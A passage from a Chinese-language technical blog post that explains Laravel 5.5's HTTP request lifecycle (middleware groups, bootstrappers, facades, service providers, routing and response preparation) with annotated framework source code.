\App\Http\Middleware\TrimStrings::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将提交请求参数中空子串转换为 null</span></span><br><span class="line">        \Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修正代理服务器后的服务器参数</span></span><br><span class="line">        \App\Http\Middleware\TrustProxies::class,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义中间件组</span></span><br><span class="line">    <span class="keyword">protected</span> $middlewareGroups = [</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Web 中间件组，应用于 routes/web.php 路由文件</span></span><br><span class="line">        <span class="string">'web'</span> =&gt; [</span><br><span class="line">            <span class="comment">// Cookie 加密解密</span></span><br><span class="line">            \App\Http\Middleware\EncryptCookies::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 Cookie 添加到响应中</span></span><br><span class="line">            \Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 开启会话</span></span><br><span class="line">            \Illuminate\Session\Middleware\StartSession::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 认证用户，此中间件以后 Auth 类才能生效</span></span><br><span class="line">            <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/authentication</span></span><br><span class="line">            \Illuminate\Session\Middleware\AuthenticateSession::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将系统的错误数据注入到视图变量 $errors 中</span></span><br><span class="line">            \Illuminate\View\Middleware\ShareErrorsFromSession::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检验 CSRF ，防止跨站请求伪造的安全威胁</span></span><br><span class="line">            <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/csrf</span></span><br><span class="line">            \App\Http\Middleware\VerifyCsrfToken::class,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理路由绑定</span></span><br><span class="line">            <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/routing#route-model-binding</span></span><br><span class="line">            \Illuminate\Routing\Middleware\SubstituteBindings::class,</span><br><span class="line">        ],</span><br><span class="line"></span><br><span class="line">        <span class="comment">// API 中间件组，应用于 routes/api.php 路由文件</span></span><br><span class="line">        <span class="string">'api'</span> =&gt; [</span><br><span class="line">            <span class="comment">// 使用别名来调用中间件</span></span><br><span class="line">            <span class="comment">// 请见：https://d.laravel-china.org/docs/5.5/middleware#为路由分配中间件</span></span><br><span class="line">            <span class="string">'throttle:60,1'</span>,</span><br><span class="line">            <span class="string">'bindings'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 中间件别名设置，允许你使用别名调用中间件，例如上面的 api 中间件组调用</span></span><br><span class="line">    <span class="keyword">protected</span> $routeMiddleware = [</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只有登录用户才能访问，我们在控制器的构造方法中大量使用</span></span><br><span class="line">        <span class="string">'auth'</span> =&gt; \Illuminate\Auth\Middleware\Authenticate::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// HTTP Basic Auth 认证</span></span><br><span class="line">        <span class="string">'auth.basic'</span> =&gt; \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理路由绑定</span></span><br><span class="line">        <span class="comment">// 见：https://d.laravel-china.org/docs/5.5/routing#route-model-binding</span></span><br><span class="line">        <span class="string">'bindings'</span> =&gt; \Illuminate\Routing\Middleware\SubstituteBindings::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用户授权功能</span></span><br><span class="line">        <span class="string">'can'</span> =&gt; \Illuminate\Auth\Middleware\Authorize::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只有游客才能访问，在 register 和 login 请求中使用，只有未登录用户才能访问这些页面</span></span><br><span class="line">        <span class="string">'guest'</span> =&gt; \App\Http\Middleware\RedirectIfAuthenticated::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 访问节流，类似于 『1 分钟只能请求 10 次』的需求，一般在 API 中使用</span></span><br><span class="line">        <span class="string">'throttle'</span> =&gt; \Illuminate\Routing\Middleware\ThrottleRequests::class,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-请求实例化"><a href="#2-请求实例化" class="headerlink" title="2. 请求实例化"></a>2. 请求实例化</h2><blockquote>
<p>以处理 Http 请求为例</p>
</blockquote>
<p><code>index.php</code> 入口文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>请求是通过 <code>Illuminate\Http\Request::capture()</code> 实例化的, 主要是将请求信息以对象形式表现出来</p>
<h2 id="3-请求处理"><a href="#3-请求处理" class="headerlink" title="3.请求处理"></a>3.请求处理</h2><p><strong>入口文件:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><code>$kernel-&gt;handle(...)</code> <strong>处理请求过程</strong></p>
<p><code>Illuminate\Foundation\Http\Kernel</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $request-&gt;enableHttpMethodParameterOverride();</span><br><span class="line"></span><br><span class="line">        $response = <span class="keyword">$this</span>-&gt;sendRequestThroughRouter($request);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;reportException($e);</span><br><span class="line"></span><br><span class="line">        $response = <span class="keyword">$this</span>-&gt;renderException($request, $e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;reportException($e = <span class="keyword">new</span> FatalThrowableError($e));</span><br><span class="line"></span><br><span class="line">        $response = <span class="keyword">$this</span>-&gt;renderException($request, $e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'events'</span>]-&gt;dispatch(</span><br><span class="line">        <span class="keyword">new</span> Events\RequestHandled($request, $response)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">sendRequestThroughRouter</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">    Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bootstrap();		<span class="comment"># 核心类初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;app))</span><br><span class="line">        -&gt;send($request)</span><br><span class="line">        -&gt;through(<span class="keyword">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : <span class="keyword">$this</span>-&gt;middleware)</span><br><span class="line">        -&gt;then(<span class="keyword">$this</span>-&gt;dispatchToRouter());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRouter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际处理请求逻辑主要在 <code>sendRequestThroughRouter</code> 方法中, 它主要做了:</p>
<ul>
<li><p>核心类的初始化</p>
</li>
<li><p>经由中间件过滤后将请求最终交由 <code>Router</code> 处理</p>
</li>
</ul>
<blockquote>
<p>对于 Http 请求处理, 中间件包括:<br>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $middleware = [</span><br><span class="line"></span><br><span class="line">   \Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode::class,</span><br><span class="line"></span><br><span class="line">   \Illuminate\Foundation\Http\Middleware\ValidatePostSize::class,</span><br><span class="line"></span><br><span class="line">    \App\Http\Middleware\TrimStrings::class,</span><br><span class="line"></span><br><span class="line">    \Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull::class,</span><br><span class="line"></span><br><span class="line">   \App\Http\Middleware\TrustProxies::class,</span><br><span class="line"></span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>该中间件数组定义在 Http 核心类中, 同时在核心类的构造函数中传递给 Router 类</p>
</blockquote>
<h3 id="3-1-请求处理环境初始化"><a href="#3-1-请求处理环境初始化" class="headerlink" title="3.1 请求处理环境初始化"></a>3.1 请求处理环境初始化</h3><p><strong>核心类的初始化</strong> <code>bootstrap()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $bootstrappers = [</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\LoadEnvironmentVariables::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\LoadConfiguration::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\HandleExceptions::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\RegisterFacades::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\RegisterProviders::class,</span><br><span class="line">    \Illuminate\Foundation\Bootstrap\BootProviders::class,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;app-&gt;hasBeenBootstrapped()) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;bootstrapWith(<span class="keyword">$this</span>-&gt;bootstrappers());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrappers</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bootstrappers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在服务容器 <code>Application</code> 类中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrapWith</span><span class="params">(array $bootstrappers)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;hasBeenBootstrapped = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($bootstrappers <span class="keyword">as</span> $bootstrapper) &#123;</span><br><span class="line">        <span class="keyword">$this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapping: '</span>.$bootstrapper, [<span class="keyword">$this</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;make($bootstrapper)-&gt;bootstrap(<span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>[<span class="string">'events'</span>]-&gt;fire(<span class="string">'bootstrapped: '</span>.$bootstrapper, [<span class="keyword">$this</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该步骤主要是主要是对核心类中定义的 <code>$bootstrappers</code> 数组元素(引导类)初始化.</p>
<blockquote>
<p>bootstrap 过程具体是在服务容器来中进行, 由核心类调用并传入待初始化的类</p>
</blockquote>
<p>Http 核心类默认包含以下 6 个启动服务:</p>
<ul>
<li>环境监测  <code>\Illuminate\Foundation\Bootstrap\LoadEnvironmentVariables::class</code></li>
</ul>
<p>从 <code>.env</code> 文件中解析环境变量到 <code>getevn()</code>, <code>$_ENV</code>, <code>$_SERVER</code>, 依赖 <code>vlucas/phpdotenv</code> 扩展包</p>
<ul>
<li>配置加载 <code>\Illuminate\Foundation\Bootstrap\LoadConfiguration::class</code></li>
</ul>
<p>载入 <code>config</code> 目录下所有 php 配置文件, 并将生成的配置存储类绑定到服务容器 <code>$app[&#39;config&#39;]</code></p>
<p>同时配置时区及 多字节格式(utf8)</p>
<ul>
<li>异常处理 <code>\Illuminate\Foundation\Bootstrap\HandleExceptions::class</code></li>
</ul>
<p>报告所有错误 <code>error_report(E_ALL)</code></p>
<p>提供对未捕获的异常, 错误的全局处理 <code>set_error_handler</code>, <code>set_exception_handler</code>, <code>register_shutdown_function</code></p>
<ul>
<li>外观注册 <code>\Illuminate\Foundation\Bootstrap\RegisterFacades::class</code></li>
</ul>
<p>从 <code>app.aliases</code> 中读取外观配置数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'aliases'</span> =&gt; [</span><br><span class="line"></span><br><span class="line">        <span class="string">'App'</span> =&gt; Illuminate\Support\Facades\App::class,</span><br><span class="line">        <span class="string">'Artisan'</span> =&gt; Illuminate\Support\Facades\Artisan::class,</span><br><span class="line">        <span class="string">'Auth'</span> =&gt; Illuminate\Support\Facades\Auth::class,</span><br><span class="line">        <span class="string">'Blade'</span> =&gt; Illuminate\Support\Facades\Blade::class,</span><br><span class="line">        <span class="string">'Broadcast'</span> =&gt; Illuminate\Support\Facades\Broadcast::class,</span><br><span class="line">        <span class="string">'Bus'</span> =&gt; Illuminate\Support\Facades\Bus::class,</span><br><span class="line">        <span class="string">'Cache'</span> =&gt; Illuminate\Support\Facades\Cache::class,</span><br><span class="line">        <span class="string">'Config'</span> =&gt; Illuminate\Support\Facades\Config::class,</span><br><span class="line">        <span class="string">'Cookie'</span> =&gt; Illuminate\Support\Facades\Cookie::class,</span><br><span class="line">        <span class="string">'Crypt'</span> =&gt; Illuminate\Support\Facades\Crypt::class,</span><br><span class="line">        <span class="string">'DB'</span> =&gt; Illuminate\Support\Facades\DB::class,</span><br><span class="line">        <span class="string">'Eloquent'</span> =&gt; Illuminate\Database\Eloquent\Model::class,</span><br><span class="line">        <span class="string">'Event'</span> =&gt; Illuminate\Support\Facades\Event::class,</span><br><span class="line">        <span class="string">'File'</span> =&gt; Illuminate\Support\Facades\File::class,</span><br><span class="line">        <span class="string">'Gate'</span> =&gt; Illuminate\Support\Facades\Gate::class,</span><br><span class="line">        <span class="string">'Hash'</span> =&gt; Illuminate\Support\Facades\Hash::class,</span><br><span class="line">        <span class="string">'Lang'</span> =&gt; Illuminate\Support\Facades\Lang::class,</span><br><span class="line">        <span class="string">'Log'</span> =&gt; Illuminate\Support\Facades\Log::class,</span><br><span class="line">        <span class="string">'Mail'</span> =&gt; Illuminate\Support\Facades\Mail::class,</span><br><span class="line">        <span class="string">'Notification'</span> =&gt; Illuminate\Support\Facades\Notification::class,</span><br><span class="line">        <span class="string">'Password'</span> =&gt; Illuminate\Support\Facades\Password::class,</span><br><span class="line">        <span class="string">'Queue'</span> =&gt; Illuminate\Support\Facades\Queue::class,</span><br><span class="line">        <span class="string">'Redirect'</span> =&gt; Illuminate\Support\Facades\Redirect::class,</span><br><span class="line">        <span class="string">'Redis'</span> =&gt; Illuminate\Support\Facades\Redis::class,</span><br><span class="line">        <span class="string">'Request'</span> =&gt; Illuminate\Support\Facades\Request::class,</span><br><span class="line">        <span class="string">'Response'</span> =&gt; Illuminate\Support\Facades\Response::class,</span><br><span class="line">        <span class="string">'Route'</span> =&gt; Illuminate\Support\Facades\Route::class,</span><br><span class="line">        <span class="string">'Schema'</span> =&gt; Illuminate\Support\Facades\Schema::class,</span><br><span class="line">        <span class="string">'Session'</span> =&gt; Illuminate\Support\Facades\Session::class,</span><br><span class="line">        <span class="string">'Storage'</span> =&gt; Illuminate\Support\Facades\Storage::class,</span><br><span class="line">        <span class="string">'URL'</span> =&gt; Illuminate\Support\Facades\URL::class,</span><br><span class="line">        <span class="string">'Validator'</span> =&gt; Illuminate\Support\Facades\Validator::class,</span><br><span class="line">        <span class="string">'View'</span> =&gt; Illuminate\Support\Facades\View::class,</span><br><span class="line"></span><br><span class="line">    ],</span><br></pre></td></tr></table></figure>

<p>使用 <code>spl_autoload_register(...)</code> 处理类加载, 配合 <code>class_alias()</code> 提供类的别名调用</p>
<p>Facade<code>外观类基类依赖</code>__callStatic` 调用方法( 使用服务容器实例化对应类)</p>
<ul>
<li>服务提供者注册 <code>\Illuminate\Foundation\Bootstrap\RegisterProviders::class</code></li>
</ul>
<p>从 <code>app.providers</code> 中读取所有服务提供者</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">'providers'</span> =&gt; [</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Laravel Framework Service Providers...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Illuminate\Auth\AuthServiceProvider::class,</span><br><span class="line">        Illuminate\Broadcasting\BroadcastServiceProvider::class,</span><br><span class="line">        Illuminate\Bus\BusServiceProvider::class,</span><br><span class="line">        Illuminate\Cache\CacheServiceProvider::class,</span><br><span class="line">        Illuminate\Foundation\Providers\ConsoleSupportServiceProvider::class,</span><br><span class="line">        Illuminate\Cookie\CookieServiceProvider::class,</span><br><span class="line">        Illuminate\Database\DatabaseServiceProvider::class,</span><br><span class="line">        Illuminate\Encryption\EncryptionServiceProvider::class,</span><br><span class="line">        Illuminate\Filesystem\FilesystemServiceProvider::class,</span><br><span class="line">        Illuminate\Foundation\Providers\FoundationServiceProvider::class,</span><br><span class="line">        Illuminate\Hashing\HashServiceProvider::class,</span><br><span class="line">        Illuminate\Mail\MailServiceProvider::class,</span><br><span class="line">        Illuminate\Notifications\NotificationServiceProvider::class,</span><br><span class="line">        Illuminate\Pagination\PaginationServiceProvider::class,</span><br><span class="line">        Illuminate\Pipeline\PipelineServiceProvider::class,</span><br><span class="line">        Illuminate\Queue\QueueServiceProvider::class,</span><br><span class="line">        Illuminate\Redis\RedisServiceProvider::class,</span><br><span class="line">        Illuminate\Auth\Passwords\PasswordResetServiceProvider::class,</span><br><span class="line">        Illuminate\Session\SessionServiceProvider::class,</span><br><span class="line">        Illuminate\Translation\TranslationServiceProvider::class,</span><br><span class="line">        Illuminate\Validation\ValidationServiceProvider::class,</span><br><span class="line">        Illuminate\View\ViewServiceProvider::class,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Package Service Providers...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Application Service Providers...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        App\Providers\AppServiceProvider::class,</span><br><span class="line">        App\Providers\AuthServiceProvider::class,</span><br><span class="line">        <span class="comment">// App\Providers\BroadcastServiceProvider::class,</span></span><br><span class="line">        App\Providers\EventServiceProvider::class,</span><br><span class="line">        App\Providers\RouteServiceProvider::class,	<span class="comment"># 路由表生成</span></span><br><span class="line">    ],</span><br></pre></td></tr></table></figure>

<p>服务提供者经过解析后分为 3 种类型的服务提供者:</p>
<pre><code>- eager 类型</code></pre><p>马上调用 <code>register</code> 注册</p>
<pre><code>- deferred 类型</code></pre><p>记录下来, 当服务容器解析对应服务时, 才注册对应的服务提供者</p>
<pre><code>- when 类型</code></pre><p>记录下来, 当对应 event 触发时在注册对应服务提供者</p>
<ul>
<li>启动提供者 <code>\Illuminate\Foundation\Bootstrap\BootProviders::class</code></li>
</ul>
<p>调用服务容器的 <code>boot()</code> 方法, 依次调用在服务容器中 <code>register</code> 的所有服务提供者的 <code>boot()</code> 方法</p>
<h3 id="3-2-路由处理请求"><a href="#3-2-路由处理请求" class="headerlink" title="3.2 路由处理请求"></a>3.2 路由处理请求</h3><p>在内核处理请求, 将请求实例通过中间件处理后, 将请求的处理交给路由 Router 进行控制器的分发.</p>
<blockquote>
<p>Http Kernel</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRouter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>路由表存储结构说明</p>
<p><code>Illuminate\Routing\Route</code> 存储单条路由</p>
<p><code>Illuminate\Routing\RouteCollection</code> 保存所有 <code>Route</code> 实例, 形成路由表</p>
<p><code>Illuminate\Routing\Router</code> 类实例持有 <code>RouteCollection</code> 路由表实例.</p>
<p>即, 一个 <code>Router</code> 持有一个 <code>RouteCollection</code>, 而 <code>RouteCollection</code> 拥有 N 个 <code>Route</code></p>
<p>在 <code>Router</code> 中对请求的处理同样经过一系列的 <strong>路由中间件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 路由处理请求的入库</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRoute</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runRoute($request, <span class="keyword">$this</span>-&gt;findRoute($request));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据请求的 url 和 method 查找对应的 route</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">findRoute</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;current = $route = <span class="keyword">$this</span>-&gt;routes-&gt;match($request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;container-&gt;instance(Route::class, $route);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $route;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据对应的请求和路由条目, 返回相应的 $response</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRoute</span><span class="params">(Request $request, Route $route)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $request-&gt;setRouteResolver(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $route;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">new</span> Events\RouteMatched($route, $request));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse($request,</span><br><span class="line">                                  <span class="keyword">$this</span>-&gt;runRouteWithinStack($route, $request)</span><br><span class="line">                                 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求经过路由中间件过滤后, 交由 route 的 run() 方法处理</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRouteWithinStack</span><span class="params">(Route $route, Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $shouldSkipMiddleware = <span class="keyword">$this</span>-&gt;container-&gt;bound(<span class="string">'middleware.disable'</span>) &amp;&amp;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;container-&gt;make(<span class="string">'middleware.disable'</span>) === <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    $middleware = $shouldSkipMiddleware ? [] : <span class="keyword">$this</span>-&gt;gatherRouteMiddleware($route);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;container))</span><br><span class="line">        -&gt;send($request)</span><br><span class="line">        -&gt;through($middleware)</span><br><span class="line">        -&gt;then(<span class="function"><span class="keyword">function</span> <span class="params">($request)</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse(</span><br><span class="line">                $request, $route-&gt;run()</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>route</code> 的 <code>run()</code> 方法最终将请求转给 <code>Illuminate\Routing\ControllerDispatcher::dispatch</code> 处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Route $route, $controller, $method)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $parameters = <span class="keyword">$this</span>-&gt;resolveClassMethodDependencies(</span><br><span class="line">    	$route-&gt;parametersWithoutNulls(), $controller, $method</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method_exists($controller, <span class="string">'callAction'</span>)) &#123;</span><br><span class="line">   	 	<span class="keyword">return</span> $controller-&gt;callAction($method, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $controller-&gt;&#123;$method&#125;(...array_values($parameters));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下的事情就是 Controller控制器 的事了.</p>
<h3 id="3-3-处理返回的-Response"><a href="#3-3-处理返回的-Response" class="headerlink" title="3.3 处理返回的 Response"></a>3.3 处理返回的 Response</h3><p>在 <code>Router</code> 中有一个方法, 用于对返回的 <code>$response</code> 进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareResponse</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::toResponse($request, $response);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Illuminate\Http\Response|\Illuminate\Http\JsonResponse</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">toResponse</span><span class="params">($request, $response)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($response <span class="keyword">instanceof</span> Responsable) &#123;</span><br><span class="line">        $response = $response-&gt;toResponse($request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($response <span class="keyword">instanceof</span> PsrResponseInterface) &#123;</span><br><span class="line">        $response = (<span class="keyword">new</span> HttpFoundationFactory)-&gt;createResponse($response);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (! $response <span class="keyword">instanceof</span> SymfonyResponse &amp;&amp;</span><br><span class="line">              ($response <span class="keyword">instanceof</span> Arrayable ||</span><br><span class="line">               $response <span class="keyword">instanceof</span> Jsonable ||</span><br><span class="line">               $response <span class="keyword">instanceof</span> ArrayObject ||</span><br><span class="line">               $response <span class="keyword">instanceof</span> JsonSerializable ||</span><br><span class="line">               is_array($response))) &#123;</span><br><span class="line">        $response = <span class="keyword">new</span> JsonResponse($response);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (! $response <span class="keyword">instanceof</span> SymfonyResponse) &#123;</span><br><span class="line">        $response = <span class="keyword">new</span> Response($response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($response-&gt;getStatusCode() === Response::HTTP_NOT_MODIFIED) &#123;</span><br><span class="line">        $response-&gt;setNotModified();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response-&gt;prepare($request);	<span class="comment"># 最后的处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述过程中, 在返回 <code>$response</code> 之前进行了最后的处理 <code>$response-&gt;prepare($request)</code></p>
<p>该过程是在 <code>Symfony\Component\HttpFoundation\Response::prepare()</code> 中进行</p>
<blockquote>
<p>对响应的封装是通过 <code>Illuminate\Http\Response</code> 类完成, 该类底层是 Symfony 框架的 Response 类</p>
</blockquote>
<blockquote>
<p>即, Symfony\Component\HttpFoundation\Response</p>
</blockquote>
